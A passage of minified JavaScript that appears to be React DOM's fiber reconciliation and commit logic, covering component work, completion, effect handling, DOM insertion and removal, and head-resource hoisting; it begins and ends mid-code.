Da(t),e===null&&ee&&(a=t.stateNode=Fr(t.type,t.pendingProps,J.current),Be=t,pt=!0,n=ve,pl(t.type)?(Ic=n,ve=bt(a.firstChild)):ve=n),qe(e,t,t.pendingProps.children,l),du(e,t),e===null&&(t.flags|=4194304),t.child;case 5:return e===null&&ee&&((n=a=ve)&&(a=Ny(a,t.type,t.pendingProps,pt),a!==null?(t.stateNode=a,Be=t,ve=bt(a.firstChild),pt=!1,n=!0):n=!1),n||nl(t)),Da(t),n=t.type,u=t.pendingProps,i=e!==null?e.memoizedProps:null,a=u.children,Kc(n,u)?a=null:i!==null&&Kc(n,i)&&(t.flags|=32),t.memoizedState!==null&&(n=Zi(e,t,Vh,null,null,l),pn._currentValue=n),du(e,t),qe(e,t,a,l),t.child;case 6:return e===null&&ee&&((e=l=ve)&&(l=My(l,t.pendingProps,pt),l!==null?(t.stateNode=l,Be=t,ve=null,e=!0):e=!1),e||nl(t)),null;case 13:return qo(e,t,l);case 4:return Ve(t,t.stateNode.containerInfo),a=t.pendingProps,e===null?t.child=ql(t,null,a,l):qe(e,t,a,l),t.child;case 11:return No(e,t,t.type,t.pendingProps,l);case 7:return qe(e,t,t.pendingProps,l),t.child;case 8:return qe(e,t,t.pendingProps.children,l),t.child;case 12:return qe(e,t,t.pendingProps.children,l),t.child;case 10:return a=t.pendingProps,ul(t,t.type,a.value),qe(e,t,a.children,l),t.child;case 9:return n=t.type._context,a=t.pendingProps.children,wl(t),n=Ye(n),a=a(n),t.flags|=1,qe(e,t,a,l),t.child;case 14:return Mo(e,t,t.type,t.pendingProps,l);case 15:return xo(e,t,t.type,t.pendingProps,l);case 19:return ko(e,t,l);case 31:return Ph(e,t,l);case 22:return Uo(e,t,l,t.pendingProps);case 24:return wl(t),a=Ye(De),e===null?(n=ji(),n===null&&(n=me,u=Ri(),n.pooledCache=u,u.refCount++,u!==null&&(n.pooledCacheLanes|=l),n=u),t.memoizedState={parent:a,cache:n},Yi(t),ul(t,De,n)):((e.lanes&l)!==0&&(qi(e,t),$a(t,null,null,l),Fa()),n=e.memoizedState,u=t.memoizedState,n.parent!==a?(n={parent:a,cache:a},t.memoizedState=n,t.lanes===0&&(t.memoizedState=t.updateQueue.baseState=n),ul(t,De,a)):(a=u.cache,ul(t,De,a),a!==n.cache&&Ui(t,[De],l,!0))),qe(e,t,t.pendingProps.children,l),t.child;case 29:throw t.pendingProps}throw Error(y(156,t.tag))}function Vt(e){e.flags|=4}function bc(e,t,l,a,n){if((t=(e.mode&32)!==0)&&(t=!1),t){if(e.flags|=16777216,(n&335544128)===n)if(e.stateNode.complete)e.flags|=8192;else if(mr())e.flags|=8192;else throw Yl=$n,Bi}else e.flags&=-16777217}function Xo(e,t){if(t.type!=="stylesheet"||(t.state.loading&4)!==0)e.flags&=-16777217;else if(e.flags|=16777216,!nd(t))if(mr())e.flags|=8192;else throw Yl=$n,Bi}function yu(e,t){t!==null&&(e.flags|=4),e.flags&16384&&(t=e.tag!==22?bs():536870912,e.lanes|=t,Sa|=t)}function an(e,t){if(!ee)switch(e.tailMode){case"hidden":t=e.tail;for(var l=null;t!==null;)t.alternate!==null&&(l=t),t=t.sibling;l===null?e.tail=null:l.sibling=null;break;case"collapsed":l=e.tail;for(var a=null;l!==null;)l.alternate!==null&&(a=l),l=l.sibling;a===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:a.sibling=null}}function pe(e){var t=e.alternate!==null&&e.alternate.child===e.child,l=0,a=0;if(t)for(var n=e.child;n!==null;)l|=n.lanes|n.childLanes,a|=n.subtreeFlags&65011712,a|=n.flags&65011712,n.return=e,n=n.sibling;else for(n=e.child;n!==null;)l|=n.lanes|n.childLanes,a|=n.subtreeFlags,a|=n.flags,n.return=e,n=n.sibling;return e.subtreeFlags|=a,e.childLanes=l,t}function ty(e,t,l){var a=t.pendingProps;switch(Di(t),t.tag){case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return pe(t),null;case 1:return pe(t),null;case 3:return l=t.stateNode,a=null,e!==null&&(a=e.memoizedState.cache),t.memoizedState.cache!==a&&(t.flags|=2048),kt(De),Oe(),l.pendingContext&&(l.context=l.pendingContext,l.pendingContext=null),(e===null||e.child===null)&&(ia(t)?Vt(t):e===null||e.memoizedState.isDehydrated&&(t.flags&256)===0||(t.flags|=1024,Ni())),pe(t),null;case 26:var n=t.type,u=t.memoizedState;return e===null?(Vt(t),u!==null?(pe(t),Xo(t,u)):(pe(t),bc(t,n,null,a,l))):u?u!==e.memoizedState?(Vt(t),pe(t),Xo(t,u)):(pe(t),t.flags&=-16777217):(e=e.memoizedProps,e!==a&&Vt(t),pe(t),bc(t,n,e,a,l)),null;case 27:if(On(t),l=J.current,n=t.type,e!==null&&t.stateNode!=null)e.memoizedProps!==a&&Vt(t);else{if(!a){if(t.stateNode===null)throw Error(y(166));return pe(t),null}e=D.current,ia(t)?Tf(t):(e=Fr(n,a,l),t.stateNode=e,Vt(t))}return pe(t),null;case 5:if(On(t),n=t.type,e!==null&&t.stateNode!=null)e.memoizedProps!==a&&Vt(t);else{if(!a){if(t.stateNode===null)throw Error(y(166));return pe(t),null}if(u=D.current,ia(t))Tf(t);else{var i=Hu(J.current);switch(u){case 1:u=i.createElementNS("http://www.w3.org/2000/svg",n);break;case 2:u=i.createElementNS("http://www.w3.org/1998/Math/MathML",n);break;default:switch(n){case"svg":u=i.createElementNS("http://www.w3.org/2000/svg",n);break;case"math":u=i.createElementNS("http://www.w3.org/1998/Math/MathML",n);break;case"script":u=i.createElement("div"),u.innerHTML="<script><\/script>",u=u.removeChild(u.firstChild);break;case"select":u=typeof a.is=="string"?i.createElement("select",{is:a.is}):i.createElement("select"),a.multiple?u.multiple=!0:a.size&&(u.size=a.size);break;default:u=typeof a.is=="string"?i.createElement(n,{is:a.is}):i.createElement(n)}}u[je]=t,u[Ke]=a;e:for(i=t.child;i!==null;){if(i.tag===5||i.tag===6)u.appendChild(i.stateNode);else if(i.tag!==4&&i.tag!==27&&i.child!==null){i.child.return=i,i=i.child;continue}if(i===t)break e;for(;i.sibling===null;){if(i.return===null||i.return===t)break e;i=i.return}i.sibling.return=i.return,i=i.sibling}t.stateNode=u;e:switch(Le(u,n,a),n){case"button":case"input":case"select":case"textarea":a=!!a.autoFocus;break e;case"img":a=!0;break e;default:a=!1}a&&Vt(t)}}return pe(t),bc(t,t.type,e===null?null:e.memoizedProps,t.pendingProps,l),null;case 6:if(e&&t.stateNode!=null)e.memoizedProps!==a&&Vt(t);else{if(typeof a!="string"&&t.stateNode===null)throw Error(y(166));if(e=J.current,ia(t)){if(e=t.stateNode,l=t.memoizedProps,a=null,n=Be,n!==null)switch(n.tag){case 27:case 5:a=n.memoizedProps}e[je]=t,e=!!(e.nodeValue===l||a!==null&&a.suppressHydrationWarning===!0||qr(e.nodeValue,l)),e||nl(t,!0)}else e=Hu(e).createTextNode(a),e[je]=t,t.stateNode=e}return pe(t),null;case 31:if(l=t.memoizedState,e===null||e.memoizedState!==null){if(a=ia(t),l!==null){if(e===null){if(!a)throw Error(y(318));if(e=t.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(y(557));e[je]=t}else Ul(),(t.flags&128)===0&&(t.memoizedState=null),t.flags|=4;pe(t),e=!1}else l=Ni(),e!==null&&e.memoizedState!==null&&(e.memoizedState.hydrationErrors=l),e=!0;if(!e)return t.flags&256?(ct(t),t):(ct(t),null);if((t.flags&128)!==0)throw Error(y(558))}return pe(t),null;case 13:if(a=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(n=ia(t),a!==null&&a.dehydrated!==null){if(e===null){if(!n)throw Error(y(318));if(n=t.memoizedState,n=n!==null?n.dehydrated:null,!n)throw Error(y(317));n[je]=t}else Ul(),(t.flags&128)===0&&(t.memoizedState=null),t.flags|=4;pe(t),n=!1}else n=Ni(),e!==null&&e.memoizedState!==null&&(e.memoizedState.hydrationErrors=n),n=!0;if(!n)return t.flags&256?(ct(t),t):(ct(t),null)}return ct(t),(t.flags&128)!==0?(t.lanes=l,t):(l=a!==null,e=e!==null&&e.memoizedState!==null,l&&(a=t.child,n=null,a.alternate!==null&&a.alternate.memoizedState!==null&&a.alternate.memoizedState.cachePool!==null&&(n=a.alternate.memoizedState.cachePool.pool),u=null,a.memoizedState!==null&&a.memoizedState.cachePool!==null&&(u=a.memoizedState.cachePool.pool),u!==n&&(a.flags|=2048)),l!==e&&l&&(t.child.flags|=8192),yu(t,t.updateQueue),pe(t),null);case 4:return Oe(),e===null&&Gc(t.stateNode.containerInfo),pe(t),null;case 10:return kt(t.type),pe(t),null;case 19:if(A(Ce),a=t.memoizedState,a===null)return pe(t),null;if(n=(t.flags&128)!==0,u=a.rendering,u===null)if(n)an(a,!1);else{if(Te!==0||e!==null&&(e.flags&128)!==0)for(e=t.child;e!==null;){if(u=tu(e),u!==null){for(t.flags|=128,an(a,!1),e=u.updateQueue,t.updateQueue=e,yu(t,e),t.subtreeFlags=0,e=l,l=t.child;l!==null;)gf(l,e),l=l.sibling;return C(Ce,Ce.current&1|2),ee&&qt(t,a.treeForkCount),t.child}e=e.sibling}a.tail!==null&&tt()>Su&&(t.flags|=128,n=!0,an(a,!1),t.lanes=4194304)}else{if(!n)if(e=tu(u),e!==null){if(t.flags|=128,n=!0,e=e.updateQueue,t.updateQueue=e,yu(t,e),an(a,!0),a.tail===null&&a.tailMode==="hidden"&&!u.alternate&&!ee)return pe(t),null}else 2*tt()-a.renderingStartTime>Su&&l!==536870912&&(t.flags|=128,n=!0,an(a,!1),t.lanes=4194304);a.isBackwards?(u.sibling=t.child,t.child=u):(e=a.last,e!==null?e.sibling=u:t.child=u,a.last=u)}return a.tail!==null?(e=a.tail,a.rendering=e,a.tail=e.sibling,a.renderingStartTime=tt(),e.sibling=null,l=Ce.current,C(Ce,n?l&1|2:l&1),ee&&qt(t,a.treeForkCount),e):(pe(t),null);case 22:case 23:return ct(t),Xi(),a=t.memoizedState!==null,e!==null?e.memoizedState!==null!==a&&(t.flags|=8192):a&&(t.flags|=8192),a?(l&536870912)!==0&&(t.flags&128)===0&&(pe(t),t.subtreeFlags&6&&(t.flags|=8192)):pe(t),l=t.updateQueue,l!==null&&yu(t,l.retryQueue),l=null,e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(l=e.memoizedState.cachePool.pool),a=null,t.memoizedState!==null&&t.memoizedState.cachePool!==null&&(a=t.memoizedState.cachePool.pool),a!==l&&(t.flags|=2048),e!==null&&A(jl),null;case 24:return l=null,e!==null&&(l=e.memoizedState.cache),t.memoizedState.cache!==l&&(t.flags|=2048),kt(De),pe(t),null;case 25:return null;case 30:return null}throw Error(y(156,t.tag))}function ly(e,t){switch(Di(t),t.tag){case 1:return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return kt(De),Oe(),e=t.flags,(e&65536)!==0&&(e&128)===0?(t.flags=e&-65537|128,t):null;case 26:case 27:case 5:return On(t),null;case 31:if(t.memoizedState!==null){if(ct(t),t.alternate===null)throw Error(y(340));Ul()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 13:if(ct(t),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(y(340));Ul()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return A(Ce),null;case 4:return Oe(),null;case 10:return kt(t.type),null;case 22:case 23:return ct(t),Xi(),e!==null&&A(jl),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 24:return kt(De),null;case 25:return null;default:return null}}function Qo(e,t){switch(Di(t),t.tag){case 3:kt(De),Oe();break;case 26:case 27:case 5:On(t);break;case 4:Oe();break;case 31:t.memoizedState!==null&&ct(t);break;case 13:ct(t);break;case 19:A(Ce);break;case 10:kt(t.type);break;case 22:case 23:ct(t),Xi(),e!==null&&A(jl);break;case 24:kt(De)}}function nn(e,t){try{var l=t.updateQueue,a=l!==null?l.lastEffect:null;if(a!==null){var n=a.next;l=n;do{if((l.tag&e)===e){a=void 0;var u=l.create,i=l.inst;a=u(),i.destroy=a}l=l.next}while(l!==n)}}catch(c){se(t,t.return,c)}}function rl(e,t,l){try{var a=t.updateQueue,n=a!==null?a.lastEffect:null;if(n!==null){var u=n.next;a=u;do{if((a.tag&e)===e){var i=a.inst,c=i.destroy;if(c!==void 0){i.destroy=void 0,n=t;var s=l,h=c;try{h()}catch(p){se(n,s,p)}}}a=a.next}while(a!==u)}}catch(p){se(t,t.return,p)}}function Vo(e){var t=e.updateQueue;if(t!==null){var l=e.stateNode;try{Rf(t,l)}catch(a){se(e,e.return,a)}}}function Zo(e,t,l){l.props=kl(e.type,e.memoizedProps),l.state=e.memoizedState;try{l.componentWillUnmount()}catch(a){se(e,t,a)}}function un(e,t){try{var l=e.ref;if(l!==null){switch(e.tag){case 26:case 27:case 5:var a=e.stateNode;break;case 30:a=e.stateNode;break;default:a=e.stateNode}typeof l=="function"?e.refCleanup=l(a):l.current=a}}catch(n){se(e,t,n)}}function xt(e,t){var l=e.ref,a=e.refCleanup;if(l!==null)if(typeof a=="function")try{a()}catch(n){se(e,t,n)}finally{e.refCleanup=null,e=e.alternate,e!=null&&(e.refCleanup=null)}else if(typeof l=="function")try{l(null)}catch(n){se(e,t,n)}else l.current=null}function Ko(e){var t=e.type,l=e.memoizedProps,a=e.stateNode;try{e:switch(t){case"button":case"input":case"select":case"textarea":l.autoFocus&&a.focus();break e;case"img":l.src?a.src=l.src:l.srcSet&&(a.srcset=l.srcSet)}}catch(n){se(e,e.return,n)}}function Tc(e,t,l){try{var a=e.stateNode;zy(a,e.type,l,t),a[Ke]=t}catch(n){se(e,e.return,n)}}function Jo(e){return e.tag===5||e.tag===3||e.tag===26||e.tag===27&&pl(e.type)||e.tag===4}function Ac(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Jo(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.tag===27&&pl(e.type)||e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Ec(e,t,l){var a=e.tag;if(a===5||a===6)e=e.stateNode,t?(l.nodeType===9?l.body:l.nodeName==="HTML"?l.ownerDocument.body:l).insertBefore(e,t):(t=l.nodeType===9?l.body:l.nodeName==="HTML"?l.ownerDocument.body:l,t.appendChild(e),l=l._reactRootContainer,l!=null||t.onclick!==null||(t.onclick=jt));else if(a!==4&&(a===27&&pl(e.type)&&(l=e.stateNode,t=null),e=e.child,e!==null))for(Ec(e,t,l),e=e.sibling;e!==null;)Ec(e,t,l),e=e.sibling}function mu(e,t,l){var a=e.tag;if(a===5||a===6)e=e.stateNode,t?l.insertBefore(e,t):l.appendChild(e);else if(a!==4&&(a===27&&pl(e.type)&&(l=e.stateNode),e=e.child,e!==null))for(mu(e,t,l),e=e.sibling;e!==null;)mu(e,t,l),e=e.sibling}function Wo(e){var t=e.stateNode,l=e.memoizedProps;try{for(var a=e.type,n=t.attributes;n.length;)t.removeAttributeNode(n[0]);Le(t,a,l),t[je]=e,t[Ke]=l}catch(u){se(e,e.return,u)}}var Zt=!1,Me=!1,zc=!1,Fo=typeof WeakSet=="function"?WeakSet:Set,Re=null;function ay(e,t){if(e=e.containerInfo,Vc=ju,e=cf(e),vi(e)){if("selectionStart"in e)var l={start:e.selectionStart,end:e.selectionEnd};else e:{l=(l=e.ownerDocument)&&l.defaultView||window;var a=l.getSelection&&l.getSelection();if(a&&a.rangeCount!==0){l=a.anchorNode;var n=a.anchorOffset,u=a.focusNode;a=a.focusOffset;try{l.nodeType,u.nodeType}catch{l=null;break e}var i=0,c=-1,s=-1,h=0,p=0,T=e,m=null;t:for(;;){for(var g;T!==l||n!==0&&T.nodeType!==3||(c=i+n),T!==u||a!==0&&T.nodeType!==3||(s=i+a),T.nodeType===3&&(i+=T.nodeValue.length),(g=T.firstChild)!==null;)m=T,T=g;for(;;){if(T===e)break t;if(m===l&&++h===n&&(c=i),m===u&&++p===a&&(s=i),(g=T.nextSibling)!==null)break;T=m,m=T.parentNode}T=g}l=c===-1||s===-1?null:{start:c,end:s}}else l=null}l=l||{start:0,end:0}}else l=null;for(Zc={focusedElem:e,selectionRange:l},ju=!1,Re=t;Re!==null;)if(t=Re,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,Re=e;else for(;Re!==null;){switch(t=Re,u=t.alternate,e=t.flags,t.tag){case 0:if((e&4)!==0&&(e=t.updateQueue,e=e!==null?e.events:null,e!==null))for(l=0;l<e.length;l++)n=e[l],n.ref.impl=n.nextImpl;break;case 11:case 15:break;case 1:if((e&1024)!==0&&u!==null){e=void 0,l=t,n=u.memoizedProps,u=u.memoizedState,a=l.stateNode;try{var _=kl(l.type,n);e=a.getSnapshotBeforeUpdate(_,u),a.__reactInternalSnapshotBeforeUpdate=e}catch(B){se(l,l.return,B)}}break;case 3:if((e&1024)!==0){if(e=t.stateNode.containerInfo,l=e.nodeType,l===9)Wc(e);else if(l===1)switch(e.nodeName){case"HEAD":case"HTML":case"BODY":Wc(e);break;default:e.textContent=""}}break;case 5:case 26:case 27:case 6:case 4:case 17:break;default:if((e&1024)!==0)throw Error(y(163))}if(e=t.sibling,e!==null){e.return=t.return,Re=e;break}Re=t.return}}function $o(e,t,l){var a=l.flags;switch(l.tag){case 0:case 11:case 15:Jt(e,l),a&4&&nn(5,l);break;case 1:if(Jt(e,l),a&4)if(e=l.stateNode,t===null)try{e.componentDidMount()}catch(i){se(l,l.return,i)}else{var n=kl(l.type,t.memoizedProps);t=t.memoizedState;try{e.componentDidUpdate(n,t,e.__reactInternalSnapshotBeforeUpdate)}catch(i){se(l,l.return,i)}}a&64&&Vo(l),a&512&&un(l,l.return);break;case 3:if(Jt(e,l),a&64&&(e=l.updateQueue,e!==null)){if(t=null,l.child!==null)switch(l.child.tag){case 27:case 5:t=l.child.stateNode;break;case 1:t=l.child.stateNode}try{Rf(e,t)}catch(i){se(l,l.return,i)}}break;case 27:t===null&&a&4&&Wo(l);case 26:case 5:Jt(e,l),t===null&&a&4&&Ko(l),a&512&&un(l,l.return);break;case 12:Jt(e,l);break;case 31:Jt(e,l),a&4&&er(e,l);break;case 13:Jt(e,l),a&4&&tr(e,l),a&64&&(e=l.memoizedState,e!==null&&(e=e.dehydrated,e!==null&&(l=dy.bind(null,l),xy(e,l))));break;case 22:if(a=l.memoizedState!==null||Zt,!a){t=t!==null&&t.memoizedState!==null||Me,n=Zt;var u=Me;Zt=a,(Me=t)&&!u?Wt(e,l,(l.subtreeFlags&8772)!==0):Jt(e,l),Zt=n,Me=u}break;case 30:break;default:Jt(e,l)}}function Io(e){var t=e.alternate;t!==null&&(e.alternate=null,Io(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&ei(t)),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}var Se=null,We=!1;function Kt(e,t,l){for(l=l.child;l!==null;)Po(e,t,l),l=l.sibling}function Po(e,t,l){if(lt&&typeof lt.onCommitFiberUnmount=="function")try{lt.onCommitFiberUnmount(Ha,l)}catch{}switch(l.tag){case 26:Me||xt(l,t),Kt(e,t,l),l.memoizedState?l.memoizedState.count--:l.stateNode&&(l=l.stateNode,l.parentNode.removeChild(l));break;case 27:Me||xt(l,t);var a=Se,n=We;pl(l.type)&&(Se=l.stateNode,We=!1),Kt(e,t,l),mn(l.stateNode),Se=a,We=n;break;case 5:Me||xt(l,t);case 6:if(a=Se,n=We,Se=null,Kt(e,t,l),Se=a,We=n,Se!==null)if(We)try{(Se.nodeType===9?Se.body:Se.nodeName==="HTML"?Se.ownerDocument.body:Se).removeChild(l.stateNode)}catch(u){se(l,t,u)}else try{Se.removeChild(l.stateNode)}catch(u){se(l,t,u)}break;case 18:Se!==null&&(We?(e=Se,Vr(e.nodeType===9?e.body:e.nodeName==="HTML"?e.ownerDocument.body:e,l.stateNode),_a(e)):Vr(Se,l.stateNode));break;case 4:a=Se,n=We,Se=l.stateNode.containerInfo,We=!0,Kt(e,t,l),Se=a,We=n;break;case 0:case 11:case 14:case 15:rl(2,l,t),Me||rl(4,l,t),Kt(e,t,l);break;case 1:Me||(xt(l,t),a=l.stateNode,typeof a.componentWillUnmount=="function"&&Zo(l,t,a)),Kt(e,t,l);break;case 21:Kt(e,t,l);break;case 22:Me=(a=Me)||l.memoizedState!==null,Kt(e,t,l),Me=a;break;default:Kt(e,t,l)}}function er(e,t){if(t.memoizedState===null&&(e=t.alternate,e!==null&&(e=e.memoizedState,e!==null))){e=e.dehydrated;try{_a(e)}catch(l){se(t,t.return,l)}}}function tr(e,t){if(t.memoizedState===null&&(e=t.alternate,e!==null&&(e=e.memoizedState,e!==null&&(e=e.dehydrated,e!==null))))try{_a(e)}catch(l){se(t,t.return,l)}}function ny(e){switch(e.tag){case 31:case 13:case 19:var t=e.stateNode;return t===null&&(t=e.stateNode=new Fo),t;case 22:return e=e.stateNode,t=e._retryCache,t===null&&(t=e._retryCache=new Fo),t;default:throw Error(y(435,e.tag))}}function gu(e,t){var l=ny(e);t.forEach(function(a){if(!l.has(a)){l.add(a);var n=hy.bind(null,e,a);a.then(n,n)}})}function Fe(e,t){var l=t.deletions;if(l!==null)for(var a=0;a<l.length;a++){var n=l[a],u=e,i=t,c=i;e:for(;c!==null;){switch(c.tag){case 27:if(pl(c.type)){Se=c.stateNode,We=!1;break e}break;case 5:Se=c.stateNode,We=!1;break e;case 3:case 4:Se=c.stateNode.containerInfo,We=!0;break e}c=c.return}if(Se===null)throw Error(y(160));Po(u,i,n),Se=null,We=!1,u=n.alternate,u!==null&&(u.return=null),n.return=null}if(t.subtreeFlags&13886)for(t=t.child;t!==null;)lr(t,e),t=t.sibling}var Ot=null;function lr(e,t){var l=e.alternate,a=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:Fe(t,e),$e(e),a&4&&(rl(3,e,e.return),nn(3,e),rl(5,e,e.return));break;case 1:Fe(t,e),$e(e),a&512&&(Me||l===null||xt(l,l.return)),a&64&&Zt&&(e=e.updateQueue,e!==null&&(a=e.callbacks,a!==null&&(l=e.shared.hiddenCallbacks,e.shared.hiddenCallbacks=l===null?a:l.concat(a))));break;case 26:var n=Ot;if(Fe(t,e),$e(e),a&512&&(Me||l===null||xt(l,l.return)),a&4){var u=l!==null?l.memoizedState:null;if(a=e.memoizedState,l===null)if(a===null)if(e.stateNode===null){e:{a=e.type,l=e.memoizedProps,n=n.ownerDocument||n;t:switch(a){case"title":u=n.getElementsByTagName("title")[0],(!u||u[xa]||u[je]||u.namespaceURI==="http://www.w3.org/2000/svg"||u.hasAttribute("itemprop"))&&(u=n.createElement(a),n.head.insertBefore(u,n.querySelector("head > title"))),Le(u,a,l),u[je]=e,Ue(u),a=u;break e;case"link":var i=ld("link","href",n).get(a+(l.href||""));if(i){for(var c=0;c<i.length;c++)if(u=i[c],u.getAttribute("href")===(l.href==null||l.href===""?null:l.href)&&u.getAttribute("rel")===(l.rel==null?null:l.rel)&&u.getAttribute("title")===(l.title==null?null:l.title)&&u.getAttribute("crossorigin")===(l.crossOrigin==null?null:l.crossOrigin)){i.splice(c,1);break t}}u=n.createElement(a),Le(u,a,l),n.head.appendChild(u);break;case"meta":if(i=ld("meta","content",n).get(a+(l.content||""))){for(c=0;c<i.length;c++)if(u=i[c],u.getAttribute("content")===(l.content==null?null:""+l.content)&&u.getAttribute("name")===(l.name==null?null:l.name)&&u.getAttribute("property")===(l.property==null?null:l.property)&&u.getAttribute("http-equiv")===(l.httpEquiv==null?null:l.httpEquiv)&&u.getAttribute("charset")===(l.charSet==null?null:l.charSet)){i.splice(c,1);break t}}u=n.createElement(a),Le(u,a,l),n.head.appendChild(u);break;default:throw Error(y(468,a))}u[je]=e,Ue(u),a=u}e.stateNode=a}else ad(n,e.type,e.stateNode);else e.stateNode=td(n,a,e.memoizedProps);else u!==a?(u===null?l.stateNode!==null&&(l=l.stateNode,l.parentNode.removeChild(l)):u.count--,a===null?ad(n,e.type,e.stateNode):td(n,a,e.memoizedProps)):a===null&&e.stateNode!==null&&Tc(e,e.memoizedProps,l.memoizedProps)}break;case 27:Fe(t,e),$e(e),a&512&&(Me||l===null||xt(l,l.return)),l!==null&&a&4&&Tc(e,e.memoizedProps,l.memoizedProps);break;case 5:if(Fe(t,e),$e(e),a&512&&(Me||l===null||xt(l,l.return)),e.flags&32){n=e.stateNode;try{Fl(n,"")}catch(_){se(e,e.return,_)}}a&4&&e.stateNode!=null&&(n=e.memoizedProps,Tc(e,n,l!==null?l.memoizedProps:n)),a&1024&&(zc=!0);break;case 6:if(Fe(t,e),$e(e),a&4){if(e.stateNode===null)throw Error(y(162));a=e.memoizedProps,l=e.stateNode;try{l.nodeValue=a}catch(_){se(e,e.return,_)}}break;case 3:if(xu=null,n=Ot,Ot=Nu(t.containerInfo),Fe(t,e),Ot=n,$e(e),a&4&&l!==null&&l.memoizedState.isDehydrated)try{_a(t.containerInfo)}catch(_){se(e,e.return,_)}zc&&(zc=!1,ar(e));break;case 4:a=Ot,Ot=Nu(e.stateNode.containerInfo),Fe(t,e),$e(e),Ot=a;break;case 12:Fe(t,e),$e(e);break;case 31:Fe(t,e),$e(e),a&4&&(a=e.updateQueue,a!==null&&(e.updateQueue=null,gu(e,a)));break;case 13:Fe(t,e),$e(e),e.child.flags&8192&&e.memoizedState!==null!=(l!==null&&l.memoizedState!==null)&&(pu=tt()),a&4&&(a=e.updateQueue,a!==null&&(e.updateQueue=null,gu(e,a)));break;case 22:n=e.memoizedState!==null;var s=l!==null&&l.memoizedState!==null,h=Zt,p=Me;if(Zt=h||n,Me=p||s,Fe(t,e),Me=p,Zt=h,$e(e),a&8192)e:for(t=e.stateNode,t._visibility=n?t._visibility&-2:t._visibility|1,n&&(l===null||s||Zt||Me||Gl(e)),l=null,t=e;;){if(t.tag===5||t.tag===26){if(l===null){s=l=t;try{if(u=s.stateNode,n)i=u.style,typeof i.setProperty=="function"?i.setProperty("display","none","important"):i.display="none";else{c=s.stateNode;var T=s.memoizedProps.style,m=T!=null&&T.hasOwnProperty("display")?T.display:null;c.style.display=m==null||typeof m=="boolean"?"":(""+m).trim()}}catch(_){se(s,s.return,_)}}}else if(t.tag===6){if(l===null){s=t;try{s.stateNode.nodeValue=n?"":s.memoizedProps}catch(_){se(s,s.return,_)}}}else if(t.tag===18){if(l===null){s=t;try{var g=s.stateNode;n?Zr(g,!0):Zr(s.stateNode,!1)}catch(_){se(s,s.return,_)}}}else if((t.tag!==22&&t.tag!==23||t.memoizedState===null||t===e)&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break e;for(;t.sibling===null;){if(t.return===null||t.return===e)break e;l===t&&(l=null),t=t.return}l===t&&(l=null),t.sibling.return=t.return,t=t.sibling}a&4&&(a=e.updateQueue,a!==null&&(l=a.retryQueue,l!==null&&(a.retryQueue=null,gu(e,l))));break;case 19:Fe(t,e),$e(e),a&4&&(a=e.updateQueue,a!==null&&(e.updateQueue=null,gu(e,a)));break;case 30:break;case 21:break;default:Fe(t,e),$e(e)}}function $e(e){var t=e.flags;if(t&2){try{for(var l,a=e.return;a!==null;){if(Jo(a)){l=a;break}a=a.return}if(l==null)throw Error(y(160));switch(l.tag){case 27:var n=l.stateNode,u=Ac(e);mu(e,u,n);break;case 5:var i=l.stateNode;l.flags&32&&(Fl(i,""),l.flags&=-33);var c=Ac(e);mu(e,c,i);break;case 3:case 4:var s=l.stateNode.containerInfo,h=Ac(e);Ec(e,h,s);break;default:throw Error(y(161))}}catch(p){se(e,e.return,p)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function ar(e){if(e.subtreeFlags&1024)for(e=e.child;e!==null;){var t=e;ar(t),t.tag===5&&t.flags&1024&&t.stateNode.reset(),e=e.sibling}}function Jt(e,t){if(t.subtreeFlags&8772)for(t=t.child;t!==null;)$o(e,t.alternate,t),t=t.sibling}function Gl(e){for(e=e.child;e!==null;){var t=e;switch(t.tag){case 0:case 11:case 14:case 15:rl(4,t,t.return),Gl(t);break;case 1:xt(t,t.return);var l=t.stateNode;typeof l.componentWillUnmount=="function"&&Zo(t,t.return,l),Gl(t);break;case 27:mn(t.stateNode);case 26:case 5:xt(t,t.return),Gl(t);break;case 22:t.memoizedState===null&&Gl(t);break;case 30:Gl(t);break;default:Gl(t)}e=e.sibling}}function Wt(e,t,l){for(l=l&&(t.subtreeFlags&8772)!==0,t=t.child;t!==null;){var a=t.alternate,n=e,u=t,i=u.flags;switch(u.tag){case 0:case 11:case 15:Wt(n,u,l),nn(4,u);break;case 1:if(Wt(n,u,l),a=u,n=a.stateNode,typeof n.componentDidMount=="function")try{n.componentDidMount()}catch(h){se(a,a.return,h)}if(a=u,n=a.updateQueue,n!==null){var c=a.stateNode;try{var s=n.shared.hiddenCallbacks;if(s!==null)for(n.shared.hiddenCallbacks=null,n=0;n<s.length;n++)Uf(s[n],c)}catch(h){se(a,a.return,h)}}l&&i&64&&Vo(u),un(u,u.return);break;case 27:Wo(u);case 26:case 5:Wt(n,u,l),l&&a===null&&i&4&&Ko(u),un(u,u.return);break;case 12:Wt(n,u,l);break;case 31:Wt(n,u,l),l&&i&4&&er(n,u);break;case 13:Wt(n,u,l),l&&i&4&&tr(n,u);break;case 22:u.memoizedState===null&&Wt(n,u,l),un(u,u.return);break;case 30:break;default:Wt(n,u,l)}t=t.sibling}}function Oc(e,t){var 